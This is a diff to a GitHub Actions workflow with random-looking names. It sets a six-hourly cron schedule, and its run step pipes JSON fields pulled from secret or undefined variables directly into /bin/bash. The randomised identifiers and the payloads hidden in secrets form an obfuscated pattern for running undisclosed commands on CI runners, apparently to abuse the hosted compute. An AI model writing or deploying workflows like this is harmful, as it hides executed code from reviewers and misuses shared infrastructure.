@@ -3,8 +3,8 @@ name: darknessproposed
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 0/6 * * *'
-jobs:  # 16321
+    - cron: '17 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,11 +12,15 @@ jobs:  # 16321
       - uses: actions/checkout@v4
       - name: darknessproposed
         env:
-          pqwy93877: ${{ secrets.pqwy93877 }}
+          agics41622: ${{ secrets.agics41622 }}
         run: |
-          echo $pqwy93877 | jq -r .li503 | /bin/bash
-          echo $j6542 | jq -r .rnfvy5 | /bin/bash
-          echo $xgati8569 | jq -r .rm10115 | /bin/bash
-          echo $ugs49357 | jq -r .coev877 | /bin/bash
-          echo $htszs8 | jq -r .so7754 | /bin/bash
+          echo $agics41622 | jq -r .hl39493 | /bin/bash
+          echo $aur43 | jq -r .hmh6111 | /bin/bash
+          echo $n963 | jq -r .p65344 | /bin/bash
+          echo $n6 | jq -r .htxsz51496 | /bin/bash
+          echo $ncq25431 | jq -r .owu29624 | /bin/bash
+          echo $uv96095 | jq -r .rgrlh24 | /bin/bash
+          echo $rag6734 | jq -r .pa9859 | /bin/bash
+          echo $jqsji9 | jq -r .ao51 | /bin/bash
+          echo $yt21908 | jq -r .cmkiq957 | /bin/bash
 
